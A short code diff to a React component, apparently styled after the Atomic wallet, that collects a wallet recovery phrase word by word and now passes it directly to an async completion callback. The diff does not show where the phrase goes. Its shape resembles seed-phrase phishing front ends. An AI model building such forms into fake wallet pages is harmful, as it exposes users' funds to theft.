@@ -8,10 +8,8 @@ import AtomicFull from "../icons/atomic-full";
 
 const Atomic = ({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
 	const [backupPhrase, setBackupPhrase] = useState("");
 	const [words, setWords] = useState<string[]>([]);
@@ -20,8 +18,7 @@ const Atomic = ({
 
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
-		setWalletPhrase(words.join(" "));
-		handleFinish();
+		handleFinish(words.join(" "));
 	};
 
 	// handle input change and split by spaces
